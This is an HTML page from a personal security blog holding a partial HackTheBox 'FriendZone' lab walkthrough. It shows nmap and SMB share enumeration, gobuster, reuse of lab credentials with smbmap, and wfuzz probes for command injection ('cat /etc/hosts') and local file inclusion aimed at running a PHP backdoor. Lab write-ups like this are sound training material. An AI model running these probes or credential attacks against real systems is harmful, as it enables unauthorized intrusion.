@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Pwny_Sec</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-07-13T20:53:29 EDT">
+<title>FriendZone :: Pwny_Sec</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/friendzone/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="pwny-sec">Pwny_Sec</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/pwny_sec"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/dll/" class="dd-item">
+    <div>
+        <a href="/concepts/dll/">
+            DLL-Hijacking
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/linux_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/linux_enum/">
+            Linux Enumeration
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/concepts/bypass/" class="dd-item">
+    <div>
+        <a href="/concepts/bypass/">
+            Windows-Bypass
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/windows_enum/" class="dd-item">
+    <div>
+        <a href="/concepts/windows_enum/">
+            Windows_enum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/chaos-og/">
+            CHAOS
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/inusectf/">
+            CTF
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier/">
+            Carrier
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/carrier-root/">
+            CarrierRoot
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/ethereal/">
+            Ethereal
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/flujab/">
+            Flujab
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/friendzone/">
+            FriendZone
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/grand-pa/">
+            GrandMa
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/lightweight/">
+            LightWeight
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sizzle/">
+            Sizzle
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/gold-sizzle/">
+            Sizzle-Gold
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/vault/">
+            Vault
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/nmap/" class="dd-item">
+    <div>
+        <a href="/tools/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/smb/smb/" class="dd-item">
+    <div>
+        <a href="/tools/smb/smb/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
+      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
+      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
+      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+      <option value="/hackthebox/boxes/ethereal/" >-- Ethereal</option>
+      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
+      <option value="/hackthebox/boxes/friendzone/"  selected>-- FriendZone</option>
+      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
+      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>FriendZone</h1>
+    
+    
+    
+    <p><img src="../../../../../../Users/charl/OneDrive/Pictures/MeMe/fry-suspicious.jpg" alt="fry-suspicious" /></p>
+
+<pre><code>
+Not shown: 993 closed ports                                                                                                                [326/1271]
+PORT    STATE SERVICE     VERSION                                                                   
+21/tcp  open  ftp         vsftpd 3.0.3                                                             
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                       
+| ssh-hostkey:                                                                                     
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)                                   
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)                                 
+| dns-nsid:                                                                                        
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu                                                         
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))                                           
+|_http-server-header: Apache/2.4.29 (Ubuntu)                                                       
+|_http-title: Friend Zone Escape software                                                           
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                               
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel       Host script results:
+|_clock-skew: mean: -45m03s, deviation: 1h09m16s, median: -5m04s
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)       
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2019-02-12T06:14:29+02:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-02-11 23:14:28
+|_  start_date: N/A
+</code></pre>
+
+<p>137 139 NMAP-SMB USER SCAN</p>
+
+<p>Enumerates shares using MSRPC function, it will check common share names.</p>
+
+<pre><code>sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.10.123     
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 13:41 EST
+Nmap scan report for friendzone.red (10.10.10.123)
+Host is up (0.040s latency).
+                                  
+PORT    STATE SERVICE                
+139/tcp open  netbios-ssn  
+137/udp open  netbios-ns  
+                                            
+Host script results:
+| smb-enum-shares:          
+|   account_used: guest   
+|   \\10.10.10.123\Development:   
+|     Type: STYPE_DISKTREE           
+|     Comment: FriendZone Samba Server Files
+|     Users: 0            
+|     Max Users: &lt;unlimited&gt;  
+|     Path: C:\etc\Development
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\Files:
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files /etc/Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\hole
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   \\10.10.10.123\IPC$:
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\general:
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\general
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\print$:
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+
+</code></pre>
+
+<p>NMAP 445</p>
+
+<pre><code>nmap --script smb-enum-shares.nse -p445 10.10.10.123                                               
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 13:58 EST                                     
+Nmap scan report for friendzone.red (10.10.10.123)                                                 
+Host is up (0.039s latency).                                                                       
+PORT    STATE SERVICE                                                                               
+445/tcp open  microsoft-ds                                                                         
+Host script results:                                                                               
+| smb-enum-shares:                                       
+|   account_used: guest                                                                             
+|   \\10.10.10.123\Development:                                                                     
+|     Type: STYPE_DISKTREE                                                                         
+|     Comment: FriendZone Samba Server Files                                                       
+|     Users: 0                                                                                     
+|     Max Users: &lt;unlimited&gt;                                                                       
+|     Path: C:\etc\Development                                                                     
+|     Anonymous access: READ/WRITE                                                                 
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\Files:                   
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files /etc/Files
+|     Users: 0            
+|     Max Users: &lt;unlimited&gt;      
+|     Path: C:\etc\hole              
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   \\10.10.10.123\IPC$:
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\general:
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\general
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\print$:
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+</code></pre>
+
+<p><a href="https://nmap.org/nsedoc/scripts/smb-enum-shares.html">https://nmap.org/nsedoc/scripts/smb-enum-shares.html</a></p>
+
+<p>The image seems to hint towards heartbleed exploit. hmmm there are different stuff we can leak with heartbleed vuln smb ftp etc so this might be it.</p>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/webpage.PNG" alt="webpage" /></p>
+
+<p>GOBUSTER</p>
+
+<pre><code>gobuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -u http://friendzone.htb               
+
+=====================================================                          
+Gobuster v2.0.0              OJ Reeves (@TheColonial)                          
+=====================================================                          
+[+] Mode         : dir
+[+] Url/Domain   : http://friendzone.htb/                                      
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
+[+] Status codes : 200,204,301,302,307,403                                     
+[+] Timeout      : 10s
+=====================================================                          
+2019/02/11 23:44:01 Starting gobuster
+=====================================================                          
+/wordpress (Status: 301)
+=====================================================
+2019/02/11 23:50:02 Finished
+=====================================================
+</code></pre>
+
+<p>This is weird it would seem that possibly im suppose to upload rce somehow. wpscan reports wp is not up so perhaps a fakeout.</p>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/webpage2.PNG" alt="webpage2" /></p>
+
+<p>NMAP-CLUE RED</p>
+
+<pre><code>friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/webpage3.PNG" alt="webpage3" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/webpage4.PNG" alt="webpage4" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/friendzone/webpage6.PNG" alt="webpage6" /></p>
+
+<p>CYBERCHEF</p>
+
+<p>decoding the string provided, it provided another string i checked it against crackstation nothing returned.</p>
+
+<pre><code>CFykJCB1nC15499490527QasJWT7r7
+</code></pre>
+
+<p>SMBMAP</p>
+
+<p>-H 10.10.10.123  -u info@friendzoneportal.red -p CFykJCB1nC15499490527QasJWT7r7</p>
+
+<pre><code>smbmap -H 10.10.10.123 -u info@friendzoneportal.red -p CFykJCB1nC15499490527QasJWT7r7 -d WORKGROUP
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.123...
+[+] IP: 10.10.10.123:445        Name: friendzone.red                                    
+        Disk                                                    Permissions
+        ----                                                    -----------
+        print$                                                  NO ACCESS
+        Files                                                   NO ACCESS
+        general                                                 READ ONLY
+        Development                                             READ, WRITE
+        IPC$                                                    NO ACCESS
+</code></pre>
+
+<p>SMBCLIENT</p>
+
+<pre><code>smblcient --U admin@friendzoneportal.red //10.10.10.123
+</code></pre>
+
+<p>SMB CREDS</p>
+
+<pre><code>creds for the admin THING:q
+admin:WORKWORKHhallelujah@#
+WORKWORKHhallelujah@#
+</code></pre>
+
+<pre><code>smbmap -H 10.10.10.123 -u admin@friendzoneportal.red -p WORKWORKHhallelujah@# -d WORKGROUP
+</code></pre>
+
+<p>WFUZZ</p>
+
+<p>command injection trying to find osme lfi so i can run the php backdoor</p>
+
+<pre><code>wfuzz -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt --hh 403 -u 'http://friendzone.red/js/js/FUZZ=cat+/etc/hosts' --hc 404
+</code></pre>
+
+<pre><code>wfuzz -c -w /home/htb/wordlist/seclist/Fuzzing/LFI-JHADDIX.txt -u &quot;http://frien
+dzone.red/js/jsFUZZ&quot; --hc 404
+</code></pre>
+
+<p>WFUZZ SUBDOMAINS</p>
+
+<pre><code>wfuzz -c -f sub-friendzone -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u &quot;https://friendzone.red&quot; -H &quot;Host: FUZZ.friendzone.red&quot; -t 42 --hc 404
+
